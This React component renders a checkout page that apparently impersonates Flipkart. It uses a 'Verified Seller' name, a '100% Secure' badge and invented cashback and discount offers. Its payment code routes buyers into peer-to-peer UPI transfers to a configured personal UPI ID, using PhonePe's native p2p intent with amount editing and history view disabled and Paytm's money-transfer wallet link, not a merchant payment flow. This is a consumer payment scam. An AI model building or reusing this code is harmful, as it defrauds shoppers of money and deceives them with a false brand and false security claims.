import React, { useEffect, useState } from "react";
import Data from "../Data";
import Gpay from "../assets/gpay_icon.svg"
import Phonepe from "../assets/phonepe.svg"
import Paytm from "../assets/paytm_icon.svg"
import Upi from "../assets/upi.svg"
import Lock from "../assets/lock.svg"

export default function Payment() {
  const [selected, setSelected] = useState("phonepe");



  const upiOptions = [
    {
      id: "phonepe",
      name: "PhonePe",
      discount: "20% Extra Discount By PhonePe",
      logo: Phonepe,
    },
    {
      id: "paytm",
      name: "PayTM",
      discount: "15% Extra Discount By Paytm",
      logo: Paytm,
    },
  ];
  const [data, setdata] = useState("")

  useEffect(() => {
    const alldata = [...Data]

    setdata(alldata[localStorage.id])
  }, []);

  // const handlepayment = () => {
  //      const upiIdss = window.APP_CONFIG.UPI_ID;


  //   const txn_id = Math.floor(Math.random() * 10000000000);
  //   let redirect_url = "";
  //   const site_name = "Verified Seller";
  //   const upiId = upiIdss;
  //   const finalAmt = data.price;

  //   switch (selected) {

  //     case 'gpay':
  //       redirect_url = "tez://upi/pay?pa=" + upiId + "&pn=" + site_name + "&am=" + finalAmt + "&mc=8999&cu=INR&tn=" + txn_id;
  //       break;

  //     case 'phonepe':
  //       redirect_url = "phonepe://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + finalAmt + "&tr=&mc=8999&cu=INR&tn=" + txn_id;
  //       break;

  //     case 'paytm':
  //       redirect_url = "paytmmp://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + finalAmt + "&tr=&mc=8999&cu=INR&tn=" + txn_id;
  //       break;

  //     case 'bhim_upi':
  //       redirect_url = "bhim://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + finalAmt + "&tr=&mc=8999&cu=INR&tn=" + txn_id;
  //       break;

  //     case 'whatspp_pay':
  //       redirect_url = "whatsapp://pay?pa=" + upiId + "&pn=" + site_name + "&am=" + finalAmt + "&tr=&mc=8999&cu=INR&tn=" + txn_id;
  //       break;
  //     default:
  //       break;
  //   }

  //    // ✅ ✅ Step 1: FIRE GOOGLE CONVERSION TAG (Dynamic)
  // const tag = window.CONVERSION_CONFIG?.PURCHASE_TAG;

  // if (window.gtag && tag) {
  //   window.gtag("event", "conversion", {
  //     send_to: tag.send_to,
  //     value: tag.value,
  //     currency: tag.currency
  //   });
  // }

  
  //   window.location.href = redirect_url;

  // }



function buildPhonePeNativeIntent({ upiId, amount, txnId }) {
       console.log("========>")
    const payload = {
        contact: {
            cbkName: "",
            nickName: "",
            vpa: upiId,       // ✅ YOUR UPI ID HERE
            type: "VPA"
        },
        p2pPaymentCheckoutParams: {
            note: txnId,
            isByDefaultKnownContact: true,
            enableSpeechToText: false,
            allowAmountEdit: false,
            showQrCodeOption: false,
            disableViewHistory: true,
            shouldShowUnsavedContactBanner: false,
            isRecurring: false,
            checkoutType: "DEFAULT",
            transactionContext: "p2p",
            initialAmount: Math.round(amount * 100), // ✅ rupees → paise
            disableNotesEdit: true,
            showKeyboard: true,
            currency: "INR",
            shouldShowMaskedNumber: true
        }
    };

    const base64Data = btoa(JSON.stringify(payload));
    return `phonepe://native?data=${encodeURIComponent(base64Data)}&id=p2ppayment`;
} 



// function handlepayment() {
//    const upiIdss = window.APP_CONFIG.UPI_ID;

//     var orderNumber = Math.floor(Math.random() * 10000000000);
//     var payType = $(".form-check.active").attr('pay-type');
//     var redirect_url = "";
//     var site_name = "Verified Seller";
//     var upi_address = upiIdss;
//     var amt = parseFloat(itemData.selling_price).toFixed(2);

//     switch (payType) {
//       case 'gpay':
//         redirect_url = "tez://upi/pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
//         break;
//         case 'phonepe':
//         redirect_url = buildPhonePeNativeIntent({upiId: upi_address, amount: amt, txnId: orderNumber });
//         console.log("redirect_urlredirect_url",redirect_url);
//             break;
//         case 'paytm':
//             redirect_url = "paytmmp://pay?ver=01&mode=19&pa=" + upi_address + "&pn=" + site_name + "&tr=RZPPXTog5fXlvIb6Wqrv2&cu=INR&mc=4215&qrMedium=04&tn=TN_" + orderNumber + "&am=" + amt + "";
//             break; 
//       case 'bhim_upi':
//         redirect_url = "bhim://pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
//         break;
//       case 'whatsapp':
//         redirect_url = "whatsapp://pay?pa=" + upi_address + "&pn=Online Store&tn=Order_Id_" + orderNumber + "&am="+ amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn="+ site_name;
//         break;
//       default:
//             break;
//     }
//     window.location.href = redirect_url;
       
//     $(document).ready(function () {
//     // Extract parameters from the URL
//    const fullPath = window.location.pathname;

//     // Find the index of '/payment' in the path
//     const paymentIndex = fullPath.indexOf('/payment');
    
//     // Check if '/payment' exists in the path
//     if (paymentIndex !== -1) {
//         // Extract everything after '/payment'
//         const pathAfterPayment = fullPath.slice(paymentIndex + '/payment'.length);

//         console.log(pathAfterPayment);
//     // Perform AJAX request with the extracted parameters
//     $.ajax({
//         type: 'POST',
//         url: pathAfterPayment + 'verify/process-payment.php', // Dynamically construct the URL
//         data: {
//             orderNumber: orderNumber,
//             payType: payType,
//             upi_address: upi_address,
//             amt: amt
//         },
        
//         success: function(response) {
//             // Check the response from the server
//             if (response === 'success') {
//                 // Redirect to the "Thank You" page after successful payment notification
//                 setTimeout(function() {
//                     window.location.href = pathAfterPayment + `verify/thankyou.php?orderNumber=${orderNumber}`;
//                 }, 20000); // 20 seconds delay
//             } else {
//                 // Handle unsuccessful payment
//                 alert("Payment failed. Please try again.");
//             }
//         },
//         error: function() {
//             // Handle error if the server notification fails
//             alert("Payment successful, but server notification failed. Please contact support.");
//         }
//     });
//     }
// });

// }



// function buildPhonePeNativeIntent({ upiId, amount, txnId }) {
//   const payload = {
//     contact: {
//       vpa: upiId,
//       type: "VPA"
//     },
//     p2pPaymentCheckoutParams: {
//       note: txnId,
//       initialAmount: Math.round(amount * 100),
//       currency: "INR"
//     }
//   };

//   const base64Data = btoa(JSON.stringify(payload));
//   return `phonepe://native?data=${encodeURIComponent(base64Data)}&id=p2ppayment`;
// }



const handlePayment = async () => {
  const upiId = window.APP_CONFIG.UPI_ID;
  const orderNumber = Math.floor(Math.random() * 1000000000);
  const amount = parseFloat(data.price).toFixed(2);
   var site_name = "Verified Seller";

  let redirectUrl = "";

  switch (selected) {
    case "gpay":
        redirectUrl = `tez://upi/pay?pa=${upiId}&pn=${site_name}&am=${amount}&mc=8999&cu=INR&tn=${orderNumber}`;
      break;

    case "phonepe":
      redirectUrl = buildPhonePeNativeIntent({
        upiId,
        amount,
        txnId: orderNumber
      });
      // redirectUrl = `phonepe://pay?pa=${upiId}&pn=${site_name}&am=${amount}&tr=&mc=8999&cu=INR&tn=${orderNumber}`;
      break;

    case "paytm":
      redirectUrl = `paytmmp://cash_wallet?pa=${upiId}&pn=Online Store&am=${amount}&tn=Order_${orderNumber}&cu=INR&featuretype=money_transfer`;
      break;

    case "bhim_upi":
      redirectUrl = `bhim://pay?pa=${upiId}&pn=Online Store&am=${amount}&tn=Order_${orderNumber}&cu=INR`;
      break;

    default:
      alert("Please select payment method");
      return;
  }

  // ✅ Save order in backend BEFORE redirect
  await fetch("/api/create-order", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      orderNumber,
      amount,
      upiId,
      payType: selected
    })
  });

  // ✅ Redirect to UPI app
  window.location.href = redirectUrl;

  // ✅ After 15 sec redirect to verify page
  // setTimeout(() => {
  //   window.location.href = `/verify-payment?order=${orderNumber}`;
  // }, 15000);
};


  return (
    <div className="max-w-md mx-auto bg-white min-h-screen border shadow-sm ">
      {/* Header */}
      <header className="flex justify-between items-center p-4 border-b">
        <div>
          <p className="text-xs text-gray-500">Step 3 of 3</p>
          <h2 className="font-semibold text-gray-800 text-lg">Payments</h2>
        </div>
        <div className="flex items-center space-x-2 bg-slate-100 rounded py-1 px-2">
          <img
            src={Lock}
            alt="lock"
            className="w-4 h-4"
          />
          <span className="text-xs font-medium text-gray-600">100% Secure</span>
        </div>
      </header>

      {/* UPI Section */}
      <section className="p-4 border-b">
        <div className="flex items-center space-x-2 mb-3">
          <img
            src={Upi}
            alt="UPI"
            className="w-6 h-6"
          />
          <h3 className="font-semibold text-gray-800">UPI</h3>
        </div>

        <div className="space-y-3 select-none"  style={{ fontFamily: "InterRegularCustom" }}>
          {upiOptions.map((option) => (
            <label
              key={option.id}
              className={` ${selected === option.id ? "border-blue-500 bg-blue-50" : "border-gray-200"
                }`}
              onClick={() => setSelected(option.id)}
            >
               <div class="payment-option mt-5">
                <img src={option.logo} alt={option.name} class="payment-icon" />
                    <div class="payment-text">Pay with  {option.name}</div>
                    <img src="https://i.postimg.cc/sD91hWWn/271228.png" alt=">" class="payment-arrow" />
               </div>
            </label>
          ))}
        </div>
          </section>

      {/* Cashback Info */}
      <div className="bg-green-50 p-4 m-4 rounded-md border border-green-200" style={{ fontFamily: "InterRegularCustom" }}>
        <h4 className="text-green-700 font-semibold mb-1">
          Cashback on First Order!
        </h4>
        <p className="text-sm text-gray-700 leading-relaxed">
          Place your order on this Flipkart product and get{" "}
          <span className="font-bold">₹500 cashback!</span> Cashback will be
          credited to your original UPI payment method (QR/PhonePe/Paytm/GPay)
          after your order is delivered to you.
        </p>
      </div>

      {/* Order Summary */}
      <div className="bg-gray-50 p-4 m-4 rounded-md border text-sm space-y-1 mb-28" style={{ fontFamily: "InterRegularCustom" }}>
        <div className="flex justify-between">
          <span>Price (1 item)</span>
          <span>₹{data.price}</span>
        </div>
        <div className="flex justify-between">
          <span>Delivery Charges</span>
          <span className="text-green-600 font-medium">FREE</span>
        </div>
        <div className="flex justify-between">
          <span>Discount fee</span>
          <span className="line-through text-gray-400">₹{data.cancelprice}</span>
        </div>
        <hr className="my-2" />
        <div className="flex justify-between font-semibold text-blue-600">
          <span>Total Amount</span>
          <span>₹{data.price}</span>
        </div>
      </div>

      {/* Footer Payment Button */}
      <footer className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex justify-between items-center max-w-md mx-auto"
       style={{ fontFamily: "InterRegularCustom" }}>
        <span className="font-semibold text-gray-800">₹{data.price}</span>
        <button className="bg-yellow-400 hover:bg-yellow-500 text-gray-900 font-semibold px-6 py-2 rounded-md shadow-md transition" onClick={handlePayment}>
          PROCEED TO PAY
        </button>
      </footer>
    </div>
  );
}
